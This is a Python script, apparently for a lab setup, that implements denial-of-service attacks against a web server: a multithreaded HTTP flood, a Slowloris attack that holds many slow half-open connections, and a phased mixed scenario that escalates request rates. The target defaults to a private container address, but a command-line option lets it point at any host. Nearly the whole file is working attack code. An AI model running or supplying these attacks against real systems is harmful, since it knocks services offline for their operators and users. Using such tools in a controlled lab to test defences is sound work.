import time
import random
import argparse
import threading
import csv
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.adapters import HTTPAdapter

class AttackSimulator:
    def __init__(self, target_ip="172.20.0.10", target_port=80, log_file="/app/attack_log.csv"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_url = f"http://{target_ip}:{target_port}/"
        self.log_file = log_file
        self.results = []
        self.lock = threading.Lock()
        self.running = True
        
        print(f"[ATTACKER] Target: {self.target_url}")
    
    def log_attack(self, attack_type, status, response_time, timestamp):
        with self.lock:
            self.results.append({
                'timestamp': timestamp,
                'attack_type': attack_type,
                'status': status,
                'response_time': response_time,
                'target': self.target_url
            })
    
    def save_logs(self):
        with open(self.log_file, 'w', newline='') as f:
            if self.results:
                writer = csv.DictWriter(f, fieldnames=self.results[0].keys())
                writer.writeheader()
                writer.writerows(self.results)
        print(f"[ATTACKER] Log saved: {len(self.results)} entries")
    
    def send_request(self, attack_type="http_flood", session=None):
        timestamp = datetime.now().isoformat()
        start_time = time.time()
        
        try:
            if session:
                response = session.get(self.target_url, timeout=3)
            else:
                response = requests.get(self.target_url, timeout=3)
            status = response.status_code
            response_time = time.time() - start_time
        except Exception:
            status = 0
            response_time = time.time() - start_time
        
        self.log_attack(attack_type, status, response_time, timestamp)
        return status, response_time
    
    def http_flood(self, duration=120, requests_per_second=100, concurrency=50):
        print(f"\n[ATTACK] HTTP FLOOD | Duration: {duration}s | Rate: {requests_per_second} req/s | Threads: {concurrency}\n")
        
        start_time = time.time()
        request_count = 0
        success_count = 0
        blocked_count = 0
        last_print = start_time
        
        sessions = []
        for _ in range(concurrency):
            session = requests.Session()
            adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1, max_retries=0)
            session.mount('http://', adapter)
            sessions.append(session)
        
        def worker(session):
            nonlocal request_count, success_count, blocked_count
            while time.time() - start_time < duration and self.running:
                status, _ = self.send_request("http_flood", session)
                with self.lock:
                    request_count += 1
                    if status == 200:
                        success_count += 1
                    else:
                        blocked_count += 1
                
                delay = 1.0 / (requests_per_second / concurrency)
                time.sleep(max(0, delay))
        
        with ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = [executor.submit(worker, sessions[i % len(sessions)]) for i in range(concurrency)]
            
            while time.time() - start_time < duration and self.running:
                time.sleep(10)
                current_time = time.time()
                if current_time - last_print >= 10:
                    elapsed = current_time - start_time
                    rate = request_count / elapsed if elapsed > 0 else 0
                    print(f"[ATTACK] {elapsed:.0f}s | Req: {request_count} | Success: {success_count} | "
                          f"Blocked: {blocked_count} | Rate: {rate:.1f}/s")
                    last_print = current_time
        
        print(f"\n[ATTACK] HTTP Flood completed: {request_count} requests | Success: {success_count} | Blocked: {blocked_count}")
        return request_count, success_count, blocked_count
    
    def slowloris(self, duration=120, connections=100):
        print(f"\n[ATTACK] SLOWLORIS | Duration: {duration}s | Connections: {connections}\n")
        
        import socket
        
        sockets = []
        
        def create_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target_ip, self.target_port))
                s.send(f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.target_ip}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                return s
            except:
                return None
        
        print(f"[ATTACK] Opening {connections} connections...")
        for _ in range(connections):
            s = create_socket()
            if s:
                sockets.append(s)
        
        print(f"[ATTACK] {len(sockets)} connections established")
        
        start_time = time.time()
        last_print = start_time
        
        while time.time() - start_time < duration and self.running:
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 9999)}\r\n".encode())
                except:
                    sockets.remove(s)
                    new_s = create_socket()
                    if new_s:
                        sockets.append(new_s)
            
            current_time = time.time()
            if current_time - last_print >= 10:
                elapsed = current_time - start_time
                print(f"[ATTACK] Slowloris: {elapsed:.0f}s | Active: {len(sockets)}")
                last_print = current_time
            
            self.log_attack("slowloris", len(sockets), 0, datetime.now().isoformat())
            time.sleep(5)
        
        for s in sockets:
            try:
                s.close()
            except:
                pass
        
        print(f"[ATTACK] Slowloris completed")
        return len(sockets)
    
    def mixed_attack(self, total_duration=600):
        print(f"\n{'#'*60}")
        print(f"[ATTACK] MIXED ATTACK SCENARIO | Duration: {total_duration}s")
        print(f"{'#'*60}\n")
        
        print("\n--- PHASE 1: WARM-UP (0-60s) ---")
        self.http_flood(duration=60, requests_per_second=30, concurrency=10)
        
        if not self.running:
            return
        
        print("\n--- PHASE 2: HTTP FLOOD (60-240s) ---")
        self.http_flood(duration=180, requests_per_second=150, concurrency=50)
        
        if not self.running:
            return
        
        print("\n--- PHASE 3: SLOWLORIS (240-360s) ---")
        self.slowloris(duration=120, connections=100)
        
        if not self.running:
            return
        
        print("\n--- PHASE 4: FINAL BURST (360-600s) ---")
        self.http_flood(duration=240, requests_per_second=200, concurrency=60)
        
        self.save_logs()
        
        print(f"\n{'#'*60}")
        print(f"[ATTACK] MIXED ATTACK COMPLETED")
        print(f"{'#'*60}")
    
    def stop(self):
        self.running = False
        print("[ATTACKER] Stopping...")

def main():
    parser = argparse.ArgumentParser(description='Attack Simulator')
    parser.add_argument('--target', type=str, default='172.20.0.10')
    parser.add_argument('--port', type=int, default=80)
    parser.add_argument('--mode', type=str, choices=['flood', 'slowloris', 'mixed'], default='flood')
    parser.add_argument('--duration', type=int, default=120)
    parser.add_argument('--rate', type=int, default=100)
    parser.add_argument('--concurrency', type=int, default=50)
    parser.add_argument('--log', type=str, default='/app/attack_log.csv')
    
    args = parser.parse_args()
    
    simulator = AttackSimulator(target_ip=args.target, target_port=args.port, log_file=args.log)
    
    try:
        if args.mode == 'flood':
            simulator.http_flood(duration=args.duration, requests_per_second=args.rate, concurrency=args.concurrency)
        elif args.mode == 'slowloris':
            simulator.slowloris(duration=args.duration, connections=args.concurrency)
        elif args.mode == 'mixed':
            simulator.mixed_attack(total_duration=args.duration)
    except KeyboardInterrupt:
        print("\n[ATTACKER] Interrupted")
        simulator.stop()
    finally:
        simulator.save_logs()

if __name__ == "__main__":
    main()
